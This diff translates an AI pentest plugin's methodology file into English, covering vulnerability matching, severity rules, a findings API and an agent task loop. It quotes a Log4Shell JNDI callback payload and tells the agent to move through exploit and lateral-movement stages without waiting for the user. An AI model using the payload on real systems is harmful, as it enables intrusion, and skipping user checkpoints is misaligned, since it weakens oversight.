@@ -1,113 +1,113 @@
 ---
 name: kb-triage
-description: CVE/PoC 知识库 · 工作方法：指纹到漏洞的匹配流程、PoC 安全验证与取证规范、漏洞报告模板、severity/CVSS 分档规则、把发现写进漏洞报告的方法。先读它再读别的分类可少走弯路；不含具体 CVE。
+description: CVE/PoC knowledge base · Methodology: fingerprint-to-vulnerability matching, safe PoC verification and evidence collection, report template, severity/CVSS classification, and recording findings in the vulnerability report. Read this before other categories to avoid unnecessary detours; no specific CVEs.
 verified: false
-sources: 公开资料整理（CVE 公告 / 公开分析 / 业务逻辑类；出处见各条参考）
+sources: Compiled from public sources (CVE advisories / public analyses / business-logic issues; see each entry's references)
 ---
 
-# 工作方法（3 条）
-> 条目为公开资料整理（出处见文末「参考」），`利用步骤` 属待验证假设；出报告前按目标版本自验并把 `verified` 置为 true。
+# Methodology (3 entries)
+> Entries are compiled from public sources (see References below). `Exploitation steps` are unverified hypotheses; validate against the target version before reporting and set `verified` to true only after verification.
 
-先用这一页定流程，再按目标类型翻具体分类。顺序：**认资产 → 指纹 → 版本 → 匹配 → 最小验证 → 利用 → 取证 → 清理**。
+Use this page to establish the workflow, then consult categories for the target type. Order: **identify asset → fingerprint → version → match → minimal verification → exploit → collect evidence → cleanup**.
 
-## 条目
+## Entries
 
-| 文件 | 漏洞 | 严重度 | 入口 |
+| File | Vulnerability | Severity | Entry point |
 |---|---|---|---|
-| `fingerprint-workflow.md` | 指纹到漏洞的匹配流程 | info | - |
-| `report-template.md` | 漏洞报告模板 | info | - |
-| `safe-verification.md` | PoC 安全验证与取证规范 | info | - |
+| `fingerprint-workflow.md` | Fingerprint-to-vulnerability matching workflow | info | - |
+| `report-template.md` | Vulnerability report template | info | - |
+| `safe-verification.md` | Safe PoC verification and evidence-collection standards | info | - |
 
-## 三条铁律
+## Three ground rules
 
-1. **版本对不上就不下结论**：PoC 打过去没反应，可能是补丁、可能是 WAF、可能是版本不在区间——三者要分开写。
-2. **先只读后写入**：未授权判定优先用 `GET /version`、`INFO`、`/actuator`、配置读取；写入型 PoC（写马、改配置）放到有授权的第二步。
-3. **每条结论都要有可复现的最小证据**：一条命令 + 一段原始响应（截图不算，要文本）。
+1. **Do not draw conclusions without a version match**: an unresponsive PoC may indicate a patch, a WAF, or an unaffected version—report these possibilities separately.
+2. **Read before writing**: prefer `GET /version`, `INFO`, `/actuator`, or configuration reads for unauthenticated checks; defer write-based PoCs (webshells, configuration changes) until a second, authorized step.
+3. **Every conclusion needs minimal reproducible evidence**: one command and an excerpt of the raw response (text, not a screenshot).
 
-## 严重度 / CVSS 分档规则（本库统一口径）
+## Severity / CVSS classification (consistent across this knowledge base)
 
-| 情况 | severity | cvss 参考 |
+| Scenario | severity | Reference CVSS |
 |---|---|---|
-| 无鉴权 RCE / 域或设备接管 / 资金面（可影响余额或资金状态） | critical | 9.0-10.0 |
-| 需低权 RCE / 任意文件读 / 越权读敏感数据 / 凭据泄露 | high | 7.0-8.9 |
-| 需特定条件的信息泄露 / 枚举 / 低频滥用 | medium | 4.0-6.9 |
+| Unauthenticated RCE / domain or device takeover / financial impact (can affect balances or financial state) | critical | 9.0-10.0 |
+| RCE requiring low privileges / arbitrary file read / unauthorized sensitive-data access / credential disclosure | high | 7.0-8.9 |
+| Conditional information disclosure / enumeration / low-frequency abuse | medium | 4.0-6.9 |
 
-- **资金面一律 critical**（哪怕 CVSS 算出来 8.x），并在条目里写明"可影响资金状态"。
-- CVSS 只是参考值，条目里的 severity 以本表口径为准；两者冲突时以本表为准并改 cvss。
-## 把发现写进漏洞报告（每个确认的漏洞都写一条）
+- **Financial impact is always classified as critical** (even if the calculated CVSS is 8.x); state "can affect financial state" in the entry.
+- CVSS is a reference only; entry severity follows this table. If the two conflict, follow this table and adjust cvss.
+## Record findings in the vulnerability report (one entry per confirmed vulnerability)
 
-插件在最上面有一个「漏洞报告」页签，它读的是 `$DSH_HOME/vuln-report/findings.json`。**每确认一个漏洞就用一条命令写入**（端口以实际 GUI 为准，默认 127.0.0.1:54429）：
+The plugin has a top-level "Vulnerability report" tab that reads `$DSH_HOME/vuln-report/findings.json`. **Write each confirmed vulnerability with one command** (use the actual GUI port; default 127.0.0.1:54429):
 
 ```bash
 curl -s -X POST http://127.0.0.1:54429/api/dsh-prompt-custom/findings \
   -H 'content-type: application/json' \
   -d '{
     "action":"upsert",
-    "title":"Apache Log4j2 JNDI 注入（Log4Shell）",
+    "title":"Apache Log4j2 JNDI injection (Log4Shell)",
     "severity":"critical",
     "cvss":10.0,
     "target":"oa.example.com",
     "url":"https://oa.example.com/api/login",
-    "category":"Java 反序列化 / JNDI",
+    "category":"Java deserialization / JNDI",
     "cve":"CVE-2021-44228",
     "verified":true,
-    "evidence":"User-Agent: ${jndi:ldap://x.dnslog.cn/a} → dnslog 收到回连，时间为 2026-11-05T09:12:33Z",
-    "description":"登录接口的 User-Agent 被写入日志，log4j-core 2.14.1 解析 lookup。",
-    "remediation":"升级 log4j-core 到 2.17.0+；临时 -Dlog4j2.formatMsgNoLookups=true。"
+    "evidence":"User-Agent: ${jndi:ldap://x.dnslog.cn/a} → DNSLog received a callback at 2026-11-05T09:12:33Z",
+    "description":"The login endpoint logs User-Agent; log4j-core 2.14.1 resolves the lookup.",
+    "remediation":"Upgrade log4j-core to 2.17.0+; temporary mitigation: -Dlog4j2.formatMsgNoLookups=true."
   }'
 ```
 
-- `severity` 只能是 `critical / high / medium / low / info`；分档按本文件"严重度 / CVSS 分档规则"。
-- 同一条漏洞再报一次就用返回里的 `id` 带上 `"id":"..."` 更新，不要重复插。
-- 修完改状态：`{"action":"status","id":"<id>","status":"fixed"}`；误报用 `false-positive`。
-- 导出给人看：浏览器打开 `http://127.0.0.1:54429/api/dsh-prompt-custom/findings.md`，或在页签上点「导出 Markdown」。
-- **未验证的不要写 `verified:true`**；证据里只放最小必要片段（脱敏），别把凭据/证件贴进去。
-### 端口与编码（两个真实踩过的坑）
+- `severity` must be `critical / high / medium / low / info`; use this file's "Severity / CVSS classification".
+- To report the same vulnerability again, include the returned `id` as `"id":"..."` to update it rather than insert a duplicate.
+- After remediation, change status: `{"action":"status","id":"<id>","status":"fixed"}`; use `false-positive` for false positives.
+- Export for review: open `http://127.0.0.1:54429/api/dsh-prompt-custom/findings.md` in a browser, or click "Export Markdown" in the tab.
+- **Do not set `verified:true` for unverified findings**; include only minimal, redacted evidence, never credentials or identity documents.
+### Ports and encoding (two real pitfalls)
 
-- **端口不是固定的 54429**：它是本次 Desktop 运行时的 GUI 端口，每次启动可能不同（例如 57641）。取法：看浏览器地址栏、读当前会话 runtime context，或 `(Get-NetTCPConnection -State Listen | Where-Object LocalPort -gt 1024).LocalPort`。前端页签里的示例会自动带 `location.origin`，直接复制最稳。
-- **PowerShell 传中文 JSON 会乱码**：`Invoke-RestMethod -Body '{"title":"SQL 注入"}'` 在 Windows 上按 GBK 送出，宿主回 `400 invalid JSON body`。正确写法：
+- **The port is not fixed at 54429**: it is the GUI port of the current Desktop runtime and may change at every launch (for example, 57641). Obtain it from the browser address bar, current session runtime context, or `(Get-NetTCPConnection -State Listen | Where-Object LocalPort -gt 1024).LocalPort`. Frontend examples automatically include `location.origin`, making them the safest to copy.
+- **PowerShell can corrupt JSON containing non-ASCII text**: on Windows, a request such as `Invoke-RestMethod -Body '{"title":"SQL injection 🔎"}'` may use GBK, causing the host to return `400 invalid JSON body`. Use explicit UTF-8:
 
 ```powershell
-$json = '{"action":"upsert","title":"SQL 注入","severity":"high"}'
+$json = '{"action":"upsert","title":"SQL injection 🔎","severity":"high"}'
 Invoke-RestMethod -Uri "http://127.0.0.1:$port/api/dsh-prompt-custom/findings" -Method POST -ContentType 'application/json; charset=utf-8' -Body ([Text.Encoding]::UTF8.GetBytes($json))
 ```
 
 ```bash
-# 或者写 UTF-8 文件再发（跨 shell 通用）
+# Alternatively, write a UTF-8 file and send it (works across shells)
 curl -s -X POST "http://127.0.0.1:$port/api/dsh-prompt-custom/findings" -H "content-type: application/json" --data-binary "@finding.json"
 ```
 
-纯英文 payload 不受影响，只有中文/emoji 会踩。
-## 用任务台账推进（自动化编排）
+ASCII-only payloads are unaffected; Chinese text and emoji can trigger this problem.
+## Advance through the task ledger (automated orchestration)
 
-插件提供两个接口，配合本文件前面的流程用：
+The plugin provides two interfaces to use with the workflow above:
 
 ```
-POST /api/dsh-prompt-custom/match        {"port":61616,"banner":"ActiveMQ 5.17.3"} → 候选条目（带命中理由）
-GET  /api/dsh-prompt-custom/campaigns    任务列表 / ?id= 详情（含 next 建议）
+POST /api/dsh-prompt-custom/match        {"port":61616,"banner":"ActiveMQ 5.17.3"} → Candidate entries with match reasons
+GET  /api/dsh-prompt-custom/campaigns    Task list / ?id= details (including next-step suggestions)
 POST /api/dsh-prompt-custom/campaigns    {"action":"create|patch|asset|step|attempt|delete|next", ...}
 ```
 
-推荐循环（每轮只做一件事，做完写回台账）：
+Recommended loop (one action per round, then record it in the ledger):
 
-1. `asset`：把新发现的 host/port/指纹写进当前任务；
-2. `match`：拿指纹换候选条目，从中选一条（优先 critical）；
-3. 按条目 PoC 验证，命中就把结果写 `finding`（漏洞报告页签），并把资产 `status` 改成 `verified`；
-4. `step`：把这一步的命令与结论写回（中断后能接着跑）；
-5. `next`：取下一阶段建议，`patch` 推进 stage。
+1. `asset`: record newly discovered hosts/ports/fingerprints in the current task.
+2. `match`: obtain candidate entries from fingerprints and select one (critical first).
+3. Verify using the entry's PoC; on success, record a `finding` (Vulnerability report tab) and set the asset's `status` to `verified`.
+4. `step`: record the command and conclusion for this step (so work can resume after interruption).
+5. `next`: retrieve the next-stage suggestion; advance the stage with `patch`.
 
-`stage` 顺序：recon → fingerprint → match → verify → exploit → lateral → report。
-不要把整个战役塞进一轮对话：**每轮一步、每步落库**，这样断点续跑、报告也能自动长出来。
-### 绑定会话（只记账，不注入）
+`stage` order: recon → fingerprint → match → verify → exploit → lateral → report.
+Do not cram the entire campaign into one conversation turn: **one step per round, persist each step**. This enables resumption and automatic report growth.
+### Session association (ledger only, no injection)
 
-- 任务可以记录“属于哪个对话”（`sessionId`），仅用于台账归类与界面展示；
-- 插件**不再往运行中的对话注入消息或系统节**：早期版本的 `followup` 唤醒会把会话历史写坏（`messages[N] 缺 role`、provider 拒收中途 system 更新），已移除；
-- 人工推进即可：在对话里说“继续任务 X”，AI 读台账后用 `campaign_upsert` 记步骤与阶段。
-## 每轮必须走完这四步（不许停在单阶段）
+- A task can record the conversation it belongs to (`sessionId`), solely for ledger organization and display.
+- The plugin **no longer injects messages or system sections into running conversations**: early `followup` wakeups corrupted history (`messages[N]` missing `role`, providers rejecting mid-conversation system updates); this behavior was removed.
+- Advance manually: say "continue task X" in the conversation; the AI reads the ledger and records steps and stages with `campaign_upsert`.
+## Complete these four steps each round (do not stop at a single stage)
 
-1. `pipeline_next` 读阶段与 `instructions`（返回的清单就是本轮待办）；
-2. 按阶段调 `kb_match` 或 `skill`（类别对应关系见插件固定规则节）；
-3. 按条目判据验证；命中写 `finding_upsert`，未命中换下一条候选；
-4. `campaign_upsert(command, result, advance=true)` 记账并**推进一格**，然后回到第 1 步，直到 `report`。
+1. Read the stage and `instructions` using `pipeline_next` (the returned list is this round's to-do list).
+2. Call `kb_match` or `skill` for the stage (category mappings are in the plugin's fixed-rules section).
+3. Verify against the entry's criteria; on success, write `finding_upsert`; otherwise try the next candidate.
+4. Record the step with `campaign_upsert(command, result, advance=true)` and **advance one stage**, then return to step 1 until `report`.
 
-一个阶段的目标达成后立即推进，不要等用户说「下一步」。
+Advance immediately when a stage's objective is met; do not wait for the user to say "next".
